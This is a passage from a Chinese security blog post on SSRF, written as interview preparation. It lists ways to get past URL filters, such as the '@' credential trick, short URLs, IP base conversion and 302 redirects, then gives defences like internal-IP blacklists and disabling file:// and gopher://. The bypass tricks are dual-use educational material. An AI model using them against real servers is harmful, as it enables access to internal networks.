⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p></blockquote><p>9.当限制为<a class="link" target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 域名</p><blockquote><p>采用http基本身份认证的方式绕过，即@<br><a class="link" target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><p>10.当限制请求IP不为内网地址</p><blockquote><p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p></blockquote><p>11.当限制请求只为http协议</p><blockquote><p>（1）采取302跳转<br>（2）采取短地址</p></blockquote><h2 id="漏洞防御办法"><a href="#漏洞防御办法" class="headerlink" title="漏洞防御办法"></a>漏洞防御办法</h2><p>根据以上攻击手段，ssrf 的防御办法如下：<br>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p><p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题</p><p>总而言之，对用户输入的url进行严格限制，一方面要严防用户输入的内容在白名单之中，另一方面要严格显示用户权限，不允许用户访问权限以外的内容。</p><p>那么这回，面试官再问ssrf，知道怎么回答了吗？</p><p>参考：</p><p><a class="link" target="_blank" rel="noopener" href="https://evilcos.me/?p=221">https://evilcos.me/?p=221 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.mytbih9w7xb0">https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.mytbih9w7xb0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/">https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12227">https://xz.aliyun.com/t/12227 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.lmlphp.com/user/64107/article/item/1251173/">https://www.lmlphp.com/user/64107/article/item/1251173/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.secpulse.com/archives/65832.html">https://www.secpulse.com/archives/65832.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul><li><strong>标题:</strong> 不过是SSRF 为什么面试官老问这个？</li><li><strong>作者:</strong> Brathon</li><li><strong>创建于:</strong> 2023-07-19 18:39:02</li><li><strong>更新于:</strong> 2023-07-19 18:40:52</li><li><strong>链接:</strong> https://fiddling.blog/2023/07/19/不过是SSRF-为什么面试官老问这个？/</li><li><strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。</li></ul></div></div><div class="recommended-article"><div class="recommended-article-header"><i aria-hidden="true"></i><span>推荐阅读</span></div><div class="recommended-article-group"><a class="recommended-article-item" href="/2023/06/12/红队的夜行衣——反反制的那些事/" title="红队的夜行衣——反反制的那些事" rel="bookmark"><img src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/cover/miku/82867352_p1.70g8sf8hv2s0.webp" alt="红队的夜行衣——反反制的那些事"> <span class="title">红队的夜行衣——反反制的那些事</span> </a><a class="recommended-article-item" href="/2023/04/23/由智能家居入门物联网安全/" title="由智能家居入门物联网安全（没写完，是个半成品" rel="bookmark"><img src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/cover/miku/32740714_p0.3iaseecvkag0.webp" alt="由智能家居入门物联网安全（没写完，是个半成品"> <span class="title">由智能家居入门物联网安全（没写完，是个半成品</span> </a><a class="recommended-article-item" href="/2023/04/23/关于社会工程学的一些个人看法/" title="关于社会工程学的一些个人看法" rel="bookmark"><img src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/cover/miku/102734382_p0.1vu0sy0v7kao.webp" alt="关于社会工程学的一些个人看法"> <span class="title">关于社会工程学的一些个人看法</span></a></div></div><div class="article-nav"><div class="article-next"><a class="next" rel="next" href="/2023/06/12/%E7%BA%A2%E9%98%9F%E7%9A%84%E5%A4%9C%E8%A1%8C%E8%A1%A3%E2%80%94%E2%80%94%E5%8F%8D%E5%8F%8D%E5%88%B6%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"><span class="title flex-center"><span class="post-nav-title-item">红队的夜行衣——反反制的那些事</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comment-anchor"></div><div class="comment-area-title"><i class="fa-solid fa-comments"></i>&nbsp;评论</div><div id="waline"></div><script type="module" data-pjax>import{init}from"https://evan.beee.top/js/waline.mjs";function loadWaline(){init({el:"#waline",serverURL:"https://waline-eight-mu.vercel.app/",lang:"zh-CN",dark:'body[class~="dark-mode"]',requiredMeta:["nick","mail"]})}{const e=setTimeout(()=>{loadWaline(),clearTimeout(e)},1e3)}</script></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">此页目录</div><div class="page-title">不过是SSRF 为什么面试官老问这个？</div><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSSRF"><span class="nav-text">什么是SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">SSRF漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="nav-text">SSRF漏洞危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E5%88%A9%E7%94%A8%E7%82%B9"><span class="nav-text">SSRF利用点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84SSRF"><span class="nav-text">代码中的SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php"><span class="nav-text">php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java"><span class="nav-text">java</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%8A%9E%E6%B3%95"><span class="nav-text">绕过办法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%E5%8A%9E%E6%B3%95"><span class="nav-text">漏洞防御办法</span></a></li></ol></div></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer"><div class="info-container"><div class="copyright-info">&copy; <span>2021</span> - 2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">Brathon</a></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item"><span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span></span></div><div class="theme-info info-item"><span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span><br><span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.2</a></span></div><div id="start_div" style="display:none">2021/12/24 18:45:00</div><div>博客已运行 <span class="odometer" id="runtime_days"></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒</div><script async data-pjax>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li><li class="go-comment"><i class="fa-regular fa-comments"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-expand-width flex-center"><i class="fa-regular fa-expand"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fa-solid fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa-solid fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/utils.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/main.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/layouts/navbarShrink.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/tools/scrollTopBottom.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/tools/lightDarkSwitch.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/tools/localSearch.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/tools/codeBlock.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/layouts/lazyload.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/tools/runtime.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/layouts/odometer.min.js"></script><link rel="stylesheet" href="https://unpkg.com/hexo-theme-redefine@2.1.2/source/assets/odometer-theme-minimal.css"><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/libs/Typed.min.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/plugins/typed.js"></script><div class="post-scripts pjax"><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/tools/tocToggle.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/libs/anime.min.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/layouts/toc.js"></script><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/plugins/tabs.js"></script></div><script src="https://unpkg.com/hexo-theme-redefine@2.1.2/source/js/libs/pjax.min.js"></script><script>window.addEventListener("DOMContentLoaded",()=>{window.pjax=new Pjax({selectors:["head title",".page-container",".pjax"],history:!0,debug:!1,cacheBust:!1,timeout:0,analytics:!1,currentUrlFullReload:!1,scrollRestoration:!1}),document.addEventListener("pjax:send",()=>{Global.utils.pjaxProgressBarStart()}),document.addEventListener("pjax:complete",()=>{Global.utils.pjaxProgressBarEnd(),window.pjax.executeScripts(document.querySelectorAll("script[data-pjax], .pjax script")),Global.refresh()})})</script></body></html>